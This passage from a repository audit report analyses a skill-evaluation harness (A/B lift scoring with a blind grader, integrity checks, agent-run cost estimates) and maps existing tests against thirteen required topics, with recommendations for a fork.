on pass. Both are outside what section 1 permits before approval.

#### What the machinery does

**[INFERRED]** It is an **A/B lift measurement with a blind grader**, not a checklist:

- **`scripts/skill-behavior-eval.workflow.js`** (158 lines) is the engine, run through the
  Workflow tool, taking a skill id as `args`. Phase *Load*: one `agent(... agentType: 'Explore')`
  reads `skills/<id>/SKILL.md` verbatim and the `capability:` list from
  `skills/<id>/evals/cases.yaml`, returning `{scenario, mustInclude[]}` per entry. Phase
  *Execute & Grade*, per scenario: a **baseline** agent (control — forbidden from reading
  anything under `skills/`, with the reason stated in the prompt) and a **treatment** agent
  (the `SKILL.md` body injected inline) run **in parallel**, each writing only into
  `.rsc/eval-sandbox/<skillId>/<arm>-<index>/`; then one **blind grader** agent scores both as
  "X" and "Y", with the slot assignment varied by `index % 2 === 0` to cancel first-output bias.
  Returns raw grader signals only.
- **`scripts/skill-behavior-eval.js`** (62 lines) is the deterministic scorer:
  `--score raw.json` prints a scorecard and exits 0/1; `--holdout raw.json` applies the transfer
  gate; `--transcripts <dir>` adds the integrity check. Exit 2 on usage/parse error.
- **`scripts/lib/behavior-score.js`** (190 lines) is pure math, no I/O, no model, no randomness.
- **`scripts/lib/eval-integrity.js`** (224 lines) answers *"did this run measure anything?"*
  from the transcripts. It structurally extracts `tool_use` blocks (never proximity-matches raw
  text — a documented earlier defect), classifies each arm by prompt marker
  (`grader` → `'adversarial, independent grader'`, `treatment` → `'=== END SKILL ==='`,
  `loader` → `'return its full text as'`, else `baseline`), and flags: the **baseline** reading
  `skills/<id>/SKILL.md` or `skills/<id>/evals/cases.yaml` (the answer key), and **any** arm
  writing under `02-DOCS/wiki/`. Writes under `.rsc/eval-sandbox/` are correct by construction.
  A violation yields **BLOCKED**, not FAIL, and the scores are **withheld** — the code is
  explicit that "a lift measured against a control that read the answer key is a lower bound of
  unknown size". Without `--transcripts` the scorecard prints `integrity NOT CHECKED`, so
  silence never reads as clean.
- **`scripts/skill-harden.workflow.js`** (265 lines) is the fix loop: `MAX_ROUNDS = 2`; per
  round it re-runs the eval, has an agent report the score, diagnoses
  `fault ∈ {skill, eval, capability}`, puts an **independent judge** on any proposed edit to
  `evals/cases.yaml`, applies a **diff judge** to the skill edit, then generates a **fresh
  hold-out scenario** and re-runs the whole eval on it. It **commits on pass** and refuses to
  commit when the last surviving edit failed the hold-out.
- **`scripts/skill-scoreboard.workflow.js`** (35 lines) fans the eval out over an explicit list
  of skill ids via `parallel(...)`. Detect-only, no fixing.
- **`scripts/eval-lint.sh`** (230 lines) and **`scripts/reviewer-guard.sh`** (67 lines) are the
  deterministic shell guards — both executed in A4.
- **`.rsc/eval-sandbox/`** is the per-(scenario, arm) write zone, under the already-gitignored
  `.rsc/`, so an eval write can neither dirty the tracked tree nor resurface as an abandoned
  diff. It is referenced in tests only by `tests/eval-integrity.test.js` (11 references).

#### Model and credential requirement

**[INFERRED]** **No API key, no model id, and no `process.env` reference appears anywhere in
`skill-behavior-eval.workflow.js`, `skill-harden.workflow.js` or
`skill-scoreboard.workflow.js`.** The only model-adjacent parameter in the whole set is
`agentType: 'Explore'` on the two loader calls. The machinery therefore runs **on the agents of
whatever assistant session executes the Workflow tool** — it inherits that session's model and
its existing authentication. This matches section 9's instruction to "use the agents available
in the session for the semantic analysis".

Consequences for section 11's budget: there is **no model pinning** and **no cost
instrumentation** in the code. Section 11 requires "models and configuration" and "limits of
cost, duration and retries" to be fixed in Stage 1; none of that exists today and all of it must
be built. The honest unit of cost is **agent runs** (multi-turn, tool-using, file-producing
sub-agents), not single completions — the executor arms are told to "Produce the ACTUAL
deliverable", so each is a full piece of work.

#### Rubrics, scoring and thresholds

**[INFERRED]** From `scripts/skill-behavior-rubric.md` (63 lines) and
`scripts/lib/behavior-score.js`:

- Per output: `score = 0.6 × (satisfied / total × 10) + 0.4 × mean(completeness, actionability, correctness, grounding)`.
  Empty output → 0; no checklist → quality only.
- Per scenario: `absolute` = treatment score; `delta` = treatment − baseline.
- Per skill: `absolute_score` = mean of absolutes; `lift` = mean of deltas.
- **Gate, both required**: `ABS_MIN = 8.5` and `LIFT_MIN = 1.0`. `lift ≤ 0` is an automatic FAIL
  however high the absolute.
- Errors **fail closed**: an errored scenario is dropped; if all drop, FAIL. A skill with **no
  `capability` scenario cannot be evaluated → FAIL until one exists.**
- Hold-out gate (`holdoutGate`) deliberately uses a **different, weaker bar**: any `lift > 0`
  passes, because "one fresh scenario graded once is noisy" and raising it to `LIFT_MIN` "would
  reject good fixes on variance alone".
- A second, document-level rubric exists separately: `scripts/skill-rubric.md` scores the skill
  **as a document**, and the behavioural rubric states a skill ships only if **both** gates are
  green. `scripts/skill-harden-rubric.md` (102 lines) defines the three mandatory fix guards
  (diff judge, hold-out, Generalization gate), and `tests/harden-generalization-gate.test.js`
  asserts their text stays present — so the rubric cannot be silently retired.

#### Repetitions today: there are none

**[INFERRED]** Each capability scenario is executed **once per arm** and graded **once**. The
`n` in the scorecard is the **number of scenarios**, not repetitions. The rubric says so
explicitly under *Anti-gaming*: **"v1 uses a single grader per scenario. Upgrade path: N=3
graders, majority vote."** So variance control is a documented intention, not an implemented
feature. Section 11 requires a "number of repetitions" to be defined — it must be built.

#### Reproducible stratified sample: absent

**[EXECUTED]** A repository-wide search of `scripts/` for
`stratif|sampl|shuffle|quota|deterministic.*select` returns only two unrelated comment hits
(`scripts/lib/skill-lint.js:21`, `scripts/lib/spec-gate.js:103`), both about code samples. There
is **no sampling, no seeded randomisation and no sample-selection logic anywhere.**
`skill-scoreboard.workflow.js` requires the caller to pass an explicit array of ids. Section
11's "reproducible selection of the sample" has **nothing to build on** and must be created
from scratch.

### B3. What it would cost to run — as far as the code reveals

**[EXECUTED]** The catalogue census, parsed with a real YAML parser over all
`skills/*/evals/cases.yaml`:

| Quantity | Value |
|---|---|
| Skill directories, each with `SKILL.md` **and** `evals/cases.yaml` | **274** |
| Well-formed `capability` scenarios (entries with both `scenario` and `must_include`) | **312** |
| Distribution per skill | 0 → **3 skills**; 1 → 238; 2 → 26; 3 → 6; 4 → 1 (`suggest`) |
| `should_trigger` prompts (routing, deterministic) | **1,804** |
| `should_not_trigger` prompts (routing, deterministic) | **1,365** |
| Internal harness skills named by section 11 | `suggest` **4** scenarios, `sdd` **3**, `ftd` **2** → **9** |

**[EXECUTED] A real defect found while counting.** Three skills — **`ux`**,
**`variant-explorer`**, **`viral-score`** — have **6 malformed `capability` entries** between
them, keyed `prompt`/`why` (and `must_include`/`prompt` for `viral-score`) instead of the
`scenario`/`must_include` the engine reads. Consequences: (a) the loader returns no usable
scenarios, so the engine returns `error: 'no-capability-scenarios'` and the rubric makes that an
automatic **FAIL** — these 3 skills **cannot be behaviourally evaluated today**; and (b)
`eval-lint.sh` counts the capability **list length** only, so it reports them as satisfying
`capability>=1`. **The deterministic gate and the evaluation engine disagree about what a
capability scenario is.** The fork must reconcile them.

**[INFERRED] Cost model, derived from the call graph.** One behavioural eval of a skill with
`N` scenarios costs **`1 + 3N` agent runs** (1 Explore loader; per scenario 2 executors in
parallel + 1 grader):

| Workload | Agent runs (at today's N=1 grader, no repetitions) |
|---|---|
| One 1-scenario skill | **4** |
| `suggest` + `sdd` + `ftd` (9 scenarios, 3 skills) | **30** |
| **Whole catalogue once** (274 loaders + 3 × 312) | **≈ 1,210** |
| A 10 % stratified sample of the rest (~27 skills, ~31 scenarios) | **≈ 120** |
| Same catalogue at the rubric's own upgrade path (N=3 graders → `1 + 5N`) | **≈ 1,834** |
| One **fix** cycle on a failing skill (`skill-harden`, worst case 2 rounds: re-eval + ~6 single agents + hold-out eval of 4 per round) | **≈ 28** |

These are counts of **sub-agent runs**, each of which plans, reads files and writes deliverables.
No price is asserted — the code reveals call structure, not cost. The cost **drivers** the code
does expose are: (1) number of scenarios, not skills, sets the floor; (2) the baseline arm is
pure overhead that doubles executor cost and exists solely to make `lift` meaningful; (3) the
grader multiplies by whatever repetition count Stage 1 chooses — today 1, the rubric's own target
3; (4) the fix loop is ~7× the cost of a detection run per failing skill; (5) `--transcripts`
integrity checking requires transcripts to be **persisted**, which no script currently does.

---

## C. Not verified — and why

| Item | Reason it was not run |
|---|---|
| `scripts/skill-behavior-eval.workflow.js` | Issues model/agent calls. Section 1 forbids executing repository code beyond the local install and the existing tests. Read only. |
| `scripts/skill-harden.workflow.js` | Issues model/agent calls **and commits to git** on pass. Doubly outside pre-approval scope. Read only. |
| `scripts/skill-scoreboard.workflow.js` | Fans out to the eval workflow; same model-call prohibition. Read only. |
| `scripts/skill-behavior-eval.js --score / --holdout` | Harmless in isolation (pure stdin/JSON), but there is no non-fabricated raw input to score without first making model calls. A fixture exists (`tests/fixtures/behavior-raw-pass.json`) and is already exercised by `tests/behavior-score.test.js`, which **did** run. |
| `npm audit` / vulnerability count | Requires the npm registry — an external service under section 1. Install used `--no-audit`. |
| `npm run manifest` (write mode) | Would rewrite `manifest.json`, a tracked file. Only the `--check` form was run. |
| `npm run design:upstream` | **Declined — confirmed external service.** **[EXECUTED]** reading `scripts/design-upstream.js` shows live `fetch` calls to `https://api.github.com/repos/…/commits`, `…/compare/…` and `…/releases` (lines 37, 42, 47). Section 1 forbids running anything that needs an external service. Not in the assigned validator list either. |
| `originality-check.js --refresh <checkout>` | Needs an external third-party repository checkout and **writes** `schema/ecc-originality.u64` + `.json`. Not run; the default read-only path was. |
| Full-suite `npm run coverage` (`c8` over the whole suite) | **Time-boxed out.** The uninstrumented suite alone takes 2 h 16 m 55 s; c8 roughly doubles it. No whole-repo coverage percentage is reported. See A5. |
| Coverage of `targets/knowledge-sync.mjs` | **Launched, then cancelled after >50 minutes without completing.** See A5 run 2. No figure reported. |
| Cause of the 8 reproducible failures (6 × `knowledge-sync`, `dsh06`, `design-engine A5`) | Reproduced but **not isolated**. The serial re-run was itself partly contended (the A4 validators ran concurrently), and per-test durations stayed at 35–62 s against a 4 s internal git timeout. Not reported as upstream defects. |
| Re-run of the suite with `TMPDIR` inside `.fork-tmp/` | Not attempted; the full suite costs ~2 h 17 m per run. Recorded as the one isolation gap in A2. |
| Whether the 39 failures also occur on upstream CI / another machine | Out of scope here; no remote access was used and no credentials were exposed. |

---

## D. Section 11 gap analysis

Section 11 requires the original tests **plus** tests for thirteen topics. Verdicts below are
grounded in the static inventory (`file:line`) and the executed run.

| # | Required test topic (section 11) | Verdict | Evidence |
|---|---|---|---|
| 1 | **Customisation present and absent** (`02-DOCS/wiki/skills/<name>/README.md`; use the original when absent) | **ABSENT** | **[EXECUTED]** a content scan of all 136 test files finds **zero** occurrences of `02-DOCS/wiki/skills`. The only adjacent precedent is per-project *agent-model* override (`tests/agent-overrides.test.js:51` "a project pin in `.rsc.json` agentModels…", `:132` "an agent the user edited survives sync"), and user-skill precedence (`tests/manifest-sharing.test.js:53` "a hand-written skill sharing a catalog name is named before anything is overwritten"). The fork's customisation path does not exist upstream, so neither do its tests. |
| 2 | **Unreadable or contradictory document** | **PARTIAL** | Unreadable is well covered: `tests/clone-bootstrap.test.js:236` "AC#20 — an unreadable manifest is reported, and nothing is offered"; `tests/context-budget.test.js:71` "marks an unreadable scope unknown and still delivers the rest"; `tests/capabilities.test.js:293` "countGaps survives a malformed log"; `tests/doctor-hook-counts.test.js:178` "an unreadable settings.json behaves exactly as before"; `tests/git-permissions.test.js:77` "an unreadable config is never overwritten"; `tests/copy-guard.test.js:146` "a broken input fails open". **Contradictory** — a document whose content conflicts with a skill — has **no test at all**, and it is the harder half. |
| 3 | **Precedence and scope** | **PARTIAL** | Strong on *file/target* precedence: `tests/agents-md-shadow.test.js:46,55,80,90` (shadow `CLAUDE.md`, never imports `AGENTS.md`, existing file never overwritten, parent-directory file suppresses the shadow); `tests/session-start-scope.test.js`; `tests/skill-ownership.test.js`; `tests/default-skill-floor.test.js`; `tests/manifest-sharing.test.js:60` "an rsc-managed skill is not a collision — it is ours to replace". **Absent** for the fork's actual precedence question: customisation vs original skill, and the scope at which a customisation applies. |
| 4 | **Monorepos** | **PARTIAL (thin)** | **[EXECUTED]** only **2** tests mention monorepos: `tests/detect-repo.test.js:66` "detectRepoProfile detects monorepo workspaces" and `tests/worktree-reaper.test.js:673` "a monorepo keeps the carve-out: nested node_modules is still disposable". Adjacent: `tests/onboarding.test.js:105,134` (workspace evidence; "a nested scan reads only the selected root and reports a parent marker path"). Detection exists; **governance resolution inside a monorepo is untested**. |
| 5 | **References and invocation routes** | **EXISTS (deterministic), needs extension** | `tests/drift-check.test.js:42-75` (broken prose link is a finding with document/line/target; fenced and inline-code links excluded; unterminated fences; `~~~` runs) backed by the executed `drift:check` over **886** prose links. Routes: `tests/routing-audit.test.js` plus the executed `routing:audit` over **3,169** prompts — **currently exit 1**. `tests/list-skills-symlinks.test.js` and `targets/index.js` link/copy cover the invocation path. Does not know the fork's new reference class. |
| 6 | **Preservation during maintenance and update** | **EXISTS** | `tests/update-preserves-work.test.js:53` "an update keeps the skills the user added with `rsc add`", `:65`, `:74`, `:95`; `tests/apply.test.js:562` "a user SessionStart hook is preserved through wiring"; `tests/agent-overrides.test.js:157` "a legacy file without a digest that differs is kept; one rsc itself wrote is upgraded"; `tests/auto-update.test.js:93` "a new major asks, and launches nothing"; `tests/knowledge-sync.test.js:255` "ks14 · a file you are editing is not overwritten". Strongest pre-existing area; **6 of these files' tests failed in the executed run** (see A2/A3). |
| 7 | **Transition from historical documentation** | **PARTIAL** | Mechanics exist: `tests/ingest-move.test.js:29` "a root file moves into `02-DOCS/raw/`, byte for byte", `:44` binary intact, `:55` name collision never overwrites, `:66` duplicate not copied twice, `:76` "project files, code, secrets and the harness itself are refused", `:91` paths outside the project refused. Legacy-layout migration: `tests/apply.test.js:202,526,540`; `tests/repair.test.js:35`. `tests/retired-skills.test.js`. **Absent**: reading a project's *pre-existing historical* docs and deriving governance from them without a silent migration. |
| 8 | **Idempotence** | **EXISTS** | **[EXECUTED]** 19 tests name it: `tests/apply.test.js:241,509,620,657,779,794` (every wired hook "materialized + idempotent"; one shared idempotent `AGENTS.md` block), `tests/agents-md-shadow.test.js:117`, `tests/capabilities.test.js:344` ".rsc/ is gitignored, additively and idempotently", and the whole of `tests/hook-idempotency.test.js:53-77` (path-separator normalisation). Good pattern to copy; says nothing yet about the governance transformation being idempotent. |
| 9 | **New skills and upstream changes** | **PARTIAL** | `tests/manifest-divergence.test.js`, `tests/drift-check.test.js`, `tests/catalog-counts.test.js:29` "every \"N skills\" claim in the published docs matches the manifest", `tests/catalog-diet.test.js`, `tests/design-engine.test.js:104,125` ("the engine ships unmodified: every script parses and RUN.md is upstream text"), `tests/danger-guard.test.js:157` "the materialized copy of the guard has not drifted from the source" (**the single skipped test**). **Absent**: ingesting an upstream delta and proving a *new* skill reaches conformance — section 9's core loop. |
| 10 | **Textual and functional conflicts** | **PARTIAL (textual only)** | **[EXECUTED]** 9 hits, and all are *git merge* conflicts in knowledge sync: `tests/knowledge-sync.test.js:306` "two working branches… merge into main without a conflict", `:489` "a teammate changing the same file twice is never a false clash", `:518` "a merge in progress inside `.worktrees/` is seen, and its conflict is left alone", `:622`, `:771`; plus collisions in `tests/manifest-sharing.test.js:60` and `tests/portable-wiring.test.js:86`. **Functional** conflict — two skills that merge cleanly but contradict each other, or a customisation that contradicts a skill — is **absent**. Section 9 states the principle ("a merge without textual conflicts does not demonstrate functional compatibility"); nothing tests it. |
| 11 | **Recovery, interruptions and concurrency** | **PARTIAL — concurrency ABSENT** | Recovery is genuinely strong: `tests/backups.test.js:20,34,47,60,87,106` (snapshot/restore, restore removes files missing before the snapshot, dry-run, newest-first, symlinks recorded as symlinks, manifest paths outside the root refused); `tests/repair.test.js:18,27,35,46,58,69`; `tests/apply.test.js:393,408,442,468`. Interruption is touched indirectly (`tests/auto-update.test.js:111` "an update still running is not launched again"; `tests/hook-once.test.js:9` "the first caller wins and the second is silenced"). **Concurrency is absent**: **[EXECUTED]** zero test files contain `Promise.all`/`Promise.allSettled`, no test runs two processes simultaneously, and the knowledge-sync lock (`targets/knowledge-sync.mjs:58,68` — `knowledge-sync.lock`, `LOCK_STALE_MS = 120_000`) has **no stale-lock or contention test**. |
| 12 | **Clean clone** | **EXISTS** | `tests/clone-bootstrap.test.js:87` "a clone carries the wiring and not what it invokes — the state under test is real", `:99,:114` (no committed hook dumps a stack trace / blocks the turn), `:174,:190,:206`; `tests/agent-install.test.js:55` "sync on a clone restores explicit agents from the committed manifest"; `tests/repair.test.js:58` "a clone with dangling links is rebuilt from the manifest"; `tests/team-clone-onboarding.test.js`; `tests/team-clone-memory.test.js`; `tests/fresh-install-coherence.test.js`. |
| 13 | **Prevention of parent reinstallation** | **PARTIAL** | Closest: `tests/repair.test.js:35` "the 0.1 nested layout is swept **without reinstalling anything**", `:69` "a wrong target is a change, so it is never applied on its own"; `tests/apply.test.js:153,165` (reinstall == update on version change; same-version reinstall does not refresh); `tests/single-harness.test.js:28,35`; `tests/agents-md-shadow.test.js:90` (parent-directory `CLAUDE.md` suppresses the shadow); `tests/memory-team-workflow.test.js:47` (one journal, in the parent project). **Absent**: anything that prevents the **parent package `@ericrisco/rsc`** from being installed over the fork — the specific risk section 11 names, and the one the fork creates by existing. |

**Summary: 4 EXISTS, 8 PARTIAL, 1 ABSENT.** The four genuinely absent or near-absent things,
in order of how much they matter to this fork: **customisation present/absent** (topic 1 — the
fork's whole feature, zero tests), **prevention of parent reinstallation** (topic 13 — a
fork-specific hazard), **functional conflict** (topic 10 — explicitly named as insufficient by
section 9), and **concurrency** (topic 11 — a lock exists, untested).

---

## E. Brownfield fixtures

Section 11 requires evaluating with brownfield fixtures covering: standards contrary to the
default, mixed patterns, migrations, missing or outdated documentation, conflicts between
skills, and projects without conflicts.

**[EXECUTED] Verdict: no brownfield fixture infrastructure exists.** `tests/fixtures/` holds 17
data files (recorded JSON payloads, one good/bad HTML pair, five session-start payloads) and no
project fixtures. There is no fixture registry, no builder, no catalogue of scenario projects.

**[INFERRED] But there is a strong, directly extensible precedent.** The most promising is the
`team()` helper at `tests/knowledge-sync.test.js:27-57`. In a `mkdtemp` directory it builds, with
real `git`:

- a `--bare` remote whose default branch is **protected** by a real `pre-receive` hook that
  rejects pushes to `main` — i.e. a realistic hosting constraint, not a mock;
- a seeded project containing `.gitignore`, `.rsc.json` (version, targets, skills, agents,
  ownSkills, optOuts), `02-DOCS/wiki/index.md`, `02-DOCS/wiki/harness/user-profile.md`,
  `01-TOOLS/README.md` and `src/app.js`;
- **two independent clones** ("Eric" and "Ana") with their own git identities, plus a `clone()`
  factory for more.

That is already a two-developer brownfield project with a wiki, a harness manifest and code.
Adding the six required brownfield variants is a matter of parameterising its seed. Secondary
precedents: the `mkdtempSync(tmpdir())` idiom in 98 of 136 files; the
`tests/fixtures/design-gate/{good,bad}` good/bad pairing (the only such pattern in the repo);
and `tests/fixtures/memory/*-session-start.json`, which shows how per-assistant payloads are
captured as fixtures.

**Where fixtures should live.** `tests/fixtures/` is the established location and is already
loaded by relative path from tests. Two cautions, both executed findings: (a) the repo's
`.gitignore` ignores `docs/`, `02-DOCS/` and `.rsc/`, so a fixture that *contains* a
`02-DOCS/` or `.rsc/` tree needs either a negation or generation at test time — the existing
code sidesteps this by **generating** those trees procedurally, which is why `team()` writes
`02-DOCS/wiki/index.md` at runtime rather than committing it; (b) `drift:knowledge`,
`knowledge:doctor` and `spec:gate` all executed to a **vacuous pass** here precisely because no
`02-DOCS/` exists in a clean clone — brownfield fixtures are what would make those three
validators mean anything.

---

## F. Implications for section 11

### What the fork can reuse as-is

1. **A real deterministic validator spine, measured.** Eight npm scripts plus two shell guards,
   all executed here; eight of ten exit 0 in 1–21 s each. Total deterministic validation of the
   full 274-skill catalogue costs **well under a minute**. Section 11's "full-catalogue
   conformance checked by deterministic validators" is therefore **cheap and already achievable**
   — the gap is coverage of the governance contract, not runtime.
2. **`validate` and `manifest:check` as the conformance host.** Both already iterate every skill
   and are wired into CI, `release.yml` and `prepublishOnly`. Asserting "every distributed skill
   carries the governance block, unmodified, with a correct digest" belongs here.
3. **`drift:check` for reference integrity** — 886 prose links, exit 0, 5.7 s.
4. **The A/B-with-blind-grader design, and its honesty machinery.** The baseline arm, the
   parity-varied X/Y slots, the withheld-scores-on-BLOCKED rule, the diff judge, and the hold-out
   transfer gate are a genuinely well-reasoned measurement design. **`behavior-score.js` and
   `eval-integrity.js` are pure, deterministic and covered by 43 unit tests (15 + 28) that all
   passed in the executed run**, with a further 19 in
   `tests/harden-generalization-gate.test.js` pinning the fix-loop guards' text in place — the
   fork should treat them as a dependency, not rewrite them.
5. **Test idioms**: the `mkdtemp` project factory (98 files), the `team()` two-developer git
   fixture, the "materialized + idempotent" assertion pattern (19 tests), and the
   backup/restore/repair suite.
6. **An existing "do not fake green" doctrine, already mechanised — reuse it verbatim.**
   `tests/gate-honesty-debt.test.js` is the closest thing in the repo to section 11's rule that
   unverified coverage must never be reported as approved. It asserts, among others: *"both
   coverage scripts report a **GAP** state distinct from PASS/SKIP/FAIL"* (`:50`),
   *"INVARIANT: `gap()` never touches the failure variable"* (`:59`), *"the GAP summary block does
   not exit"* (`:74`), *"neither script still claims \"all checks passed\" while a GAP exists"*
   (`:102`), *"verify maps a GAP onto SUSTITUIDA rather than inventing a fourth label"* (`:121`),
   and *"implement forbids the four ways of manufacturing green"* with *"each prohibition carries
   its reason, not just the ban"* (`:216`, `:228`). The fork's evaluation budget needs exactly
   this vocabulary: when the budget runs out, the result is **GAP**, not PASS. The pattern — and
   its tests — already exist and should be adopted rather than reinvented. The same instinct
   appears in the eval code itself (`BLOCKED` ≠ `FAIL`, scores withheld) and in
   `tests/design-engine.test.js:56` (*"a skipped gate must never read as a green one"*).

### What the fork must build

1. **Tests for the four absent topics** — customisation present/absent (topic 1, currently
   **zero** tests), parent-reinstall prevention (13), functional conflict (10), concurrency (11).
2. **Repetitions.** There are none today; `n` is scenario count, not repetitions. The rubric's own
   stated upgrade path — **N=3 graders, majority vote** — is the obvious starting point, and it
   triples grader cost.
3. **A reproducible stratified sample.** Nothing exists: no sampling, no seeded selection. It must
   be deterministic from a committed seed so a maintenance run can be replayed.
4. **Cost, duration and retry instrumentation.** No model pinning, no token accounting, no retry
   policy, no inconclusive-result handling anywhere in the eval code. Section 11 demands all four.
5. **Transcript persistence.** `--transcripts` is the only thing standing between a reported lift
   and a contaminated one, yet no script currently writes transcripts to disk. Without it every
   scorecard says `integrity NOT CHECKED`. This should be mandatory, not optional, for anything
   gating promotion.
6. **Brownfield fixtures** — six variants, parameterised off `team()`.
7. **Two upstream defects to fix before relying on these gates.** `eval-lint.sh` **fails open**
   when PyYAML is absent (executed: 274 SKIPs, `RESULT: PASS`, exit 0) — it must become a hard
   failure and preferably move to Node. And the **3 skills with malformed `capability` entries**
   (`ux`, `variant-explorer`, `viral-score`) pass `eval-lint` while being un-evaluable by the
   engine — the deterministic gate and the engine must be made to agree.
8. **A decision about `routing:audit`.** It is the validator most aligned with section 11's
   "invocation routes", it is **not in CI**, and it is **red at the base commit** (84.9 % vs an
   85 % floor). Adding a uniform governance block to 274 descriptions is exactly the kind of
   change that moves it. It should be wired into CI with the base-commit number recorded as the
   baseline.
9. **A faster test lane.** 2 h 17 m for one suite run, with ~30 of 39 failures attributable to
   load, is not a workable maintenance gate. The timing-sensitive constants are identifiable and
   few: `LOCAL_TIMEOUT_MS = 4_000` in `targets/knowledge-sync.mjs:66` and the 300 ms
   `waitFor` in `tests/auto-update.test.js:86`.

### Honest first estimate of the evaluation workload

Per section 11, each integration must behaviourally evaluate: every new or modified skill; the
internal harness skills (`suggest`, `ftd`, `sdd`, plus any the audit adds); and a stratified
sample of the rest. In **agent runs** (the unit the code reveals), at today's `1 + 3N`:

| Scenario per integration | Skills | Scenarios | Agent runs |
|---|---|---|---|
| Internal harness skills as section 11 names them literally (`suggest` 4, `sdd` 3, `ftd` 2) | 3 | 9 | **≈ 30** |
| Internal set as this audit would actually scope it — section 11 also says *"and those identified by the audit"*. **[EXECUTED]** a candidate set of harness-internal / workflow skills (`suggest`, `ftd`, `sdd`, `sdd-init`, `specify`, `clarify`, `orient`, `init`, `harness`, `plan`, `review`, `implement`, `verify`, `analyze`, `constitution`, `tidy`, `ship`, `author-skill`, `skill-scout`, `debug`, `code-review`, `source-grounded-development`, `decision-records`, `context-budget`, `continuous-learning`, `parallel`, `worktrees`, `agent-eval`, `agent-safety`) — 29 of them exist and carry 43 scenarios | 29 | 43 | **≈ 158** |
| Internal + a typical upstream delta (say 10 new/modified skills) | ~13 | ~21 | **≈ 76** |
| Internal + delta + a 10 % stratified sample (~27 skills) | ~40 | ~52 | **≈ 196** |
| **Transversal change** (the governance mechanism itself changes → section 11 says widen to the impact, i.e. the whole catalogue) | 274 | 312 | **≈ 1,210** |
| Whole catalogue at N=3 graders (`1 + 5N`) | 274 | 312 | **≈ 1,834** |
| Add a fix cycle per failing skill (`skill-harden`, 2 rounds) | per skill | — | **+ ≈ 28 each** |

**The dominant cost driver is not the catalogue size but the transversal-change rule.** Because
the fork's whole premise is a shared governance mechanism applied to every skill, *any* change to
that mechanism triggers the ~1,210-run (or ~1,834-run at N=3) full-catalogue case. A realistic
budget must therefore (a) define "relevant change" narrowly and in writing, as section 11
demands, (b) make the governance block's conformance checkable **deterministically** — under a
minute for all 274 — so that semantic evaluation is reserved for behaviour the validators cannot
see, and (c) accept section 11's own instruction: when the budget is exhausted, **record the
pending coverage rather than lowering the thresholds**, and do not mark as approved what was
never verified.

Secondary drivers, in order: the baseline arm (doubles executor cost, and is non-negotiable —
without it `lift` is meaningless); grader repetitions (×1 today, ×3 at the documented target);
the fix loop (~7× a detection run per failing skill); and transcript persistence plus integrity
checking, which is pure overhead that nonetheless must be paid for any number that gates
promotion.

No prices are given. Nothing in the code reveals a model, a rate or a token count, and the
report does not invent one.
